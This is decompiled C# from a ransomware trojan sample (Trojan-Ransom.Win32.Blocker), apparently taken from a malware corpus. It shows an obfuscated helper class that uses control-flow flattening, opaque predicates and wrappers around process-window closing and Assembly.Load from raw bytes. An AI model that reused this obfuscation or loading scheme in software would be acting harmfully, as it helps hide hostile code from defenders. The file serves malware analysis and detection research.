// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using \u0004;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

public class \u0003
{
  static \u0003() => \u0001.\u0001();

  internal static uint Ⴄ([In] uint obj0, [In] uint obj1, [In] int obj2, [In] int obj3)
  {
    if (true)
    {
      if (false)
        goto label_3;
      else
        goto label_16;
    }
label_2:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴄ);
label_3:
    int num1 = 3;
label_15:
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_13;
        case 1:
          num1 = 3;
          continue;
        case 2:
        case 4:
        case 6:
          if (false)
            goto case 1;
          else
            goto label_18;
        case 3:
        case 5:
          goto label_16;
        case 8:
          num1 = 3;
          continue;
        default:
          goto label_2;
      }
    }
label_13:
    return Math.Max(obj0, obj1);
label_18:
    return Math.Min(obj0, obj1);
label_16:
    int num2 = obj3;
    int num3 = obj2;
    if (true)
    {
      int num4 = num2 ^ num3;
      num3 = 86;
      num2 = num4;
    }
    int num5;
    switch (num2 - num3)
    {
      case 0:
        num5 = 4;
        break;
      case 1:
        int num6 = 0;
        if (num6 != 0)
          return (uint) num6;
        num5 = num6;
        break;
      default:
        num5 = 1;
        break;
    }
    num1 = num5;
    goto label_15;
  }

  internal static Encoding Ⴃ([In] int obj0, [In] int obj1)
  {
label_3:
    if (true)
      goto label_12;
label_1:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴃ);
    int num1;
    if (true)
      num1 = 1;
label_11:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 6:
          num1 = 1;
          continue;
        case 1:
          goto label_3;
        case 2:
          num1 = 1;
          continue;
        case 4:
        case 7:
          if (false)
            goto case 2;
          else
            goto label_14;
        default:
          goto label_1;
      }
    }
label_14:
    return Encoding.UTF8;
label_12:
    int num2 = obj1;
    int num3 = obj0;
    if (true)
    {
      int num4 = num2 ^ num3;
      num3 = 95;
      num2 = num4;
    }
    int num5;
    switch (num2 - num3)
    {
      case 0:
        num5 = 7;
        break;
      default:
        num5 = 2;
        break;
    }
    num1 = num5;
    goto label_11;
  }

  internal static byte[] Ⴓ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
  {
    if (false)
      goto label_6;
    else
      goto label_12;
label_1:
    int num1;
    int num2;
    if (true)
      num2 = num1;
    else
      goto label_7;
label_2:
    switch (num2)
    {
      case 0:
      case 7:
        goto label_12;
      case 1:
        num1 = 7;
        goto label_1;
      case 2:
      case 5:
      case 6:
        return obj0.ToArray();
      case 4:
        goto label_10;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴓ);
        num1 = 7;
        goto label_1;
    }
label_6:
    int num3 = 1;
    goto label_14;
label_7:
    num3 = 2;
    goto label_14;
label_10:
    num1 = 7;
    goto label_1;
label_12:
    int num4 = obj2;
    if (false)
    {
      num2 = num4;
      goto label_2;
    }
    else
    {
      if (true)
        goto label_13;
label_5:
      switch (num4)
      {
        case 0:
          goto label_7;
        default:
          goto label_6;
      }
label_13:
      int num5 = obj1;
      num4 = (num4 ^ num5) - 32;
      goto label_5;
    }
label_14:
    num1 = num3;
    if (false)
      goto label_10;
    else
      goto label_1;
  }

  internal static bool Ⴈ([In] Process obj0, [In] int obj1, [In] int obj2)
  {
    if (false)
      goto label_6;
    else
      goto label_12;
label_1:
    int num1;
    int num2;
    if (true)
      num2 = num1;
    else
      goto label_7;
label_2:
    switch (num2)
    {
      case 0:
      case 2:
      case 7:
        return obj0.CloseMainWindow();
      case 1:
        num1 = 3;
        goto label_1;
      case 3:
        goto label_12;
      case 5:
      case 6:
        goto label_10;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴈ);
        num1 = 3;
        goto label_1;
    }
label_6:
    int num3 = 1;
    goto label_14;
label_7:
    num3 = 2;
    goto label_14;
label_10:
    num1 = 3;
    goto label_1;
label_12:
    int num4 = obj2;
    if (false)
    {
      num2 = num4;
      goto label_2;
    }
    else
    {
      if (true)
        goto label_13;
label_5:
      switch (num4)
      {
        case 0:
          goto label_7;
        default:
          goto label_6;
      }
label_13:
      int num5 = obj1;
      num4 = (num4 ^ num5) - 105;
      goto label_5;
    }
label_14:
    num1 = num3;
    if (false)
      goto label_10;
    else
      goto label_1;
  }

  internal static string Ⴍ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
  {
    do
    {
      do
        ;
      while (false);
      switch (obj3 ^ obj2)
      {
        case 118:
          continue;
        default:
          if (false)
            goto label_4;
          else
            continue;
      }
    }
    while (false);
label_4:
    return obj0 + obj1;
  }

  internal static byte[] Ⴐ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
  {
    do
    {
      int num1 = obj2 ^ obj1;
      int num2;
      while (true)
      {
        num2 = num1 - 122;
        if (false)
          num1 = num2;
        else
          break;
      }
      switch (num2)
      {
        case 0:
          continue;
        default:
          continue;
      }
    }
    while (false);
    return obj0.ToArray();
  }

  internal static Assembly Ⴗ([In] byte[] obj0, [In] byte[] obj1, [In] Evidence obj2, [In] int obj3, [In] int obj4)
  {
    do
    {
      do
        ;
      while (false);
      switch (obj4 ^ obj3)
      {
        case 73:
          continue;
        default:
          if (false)
            goto label_4;
          else
            continue;
      }
    }
    while (false);
label_4:
    return Assembly.Load(obj0, obj1, obj2);
  }
}
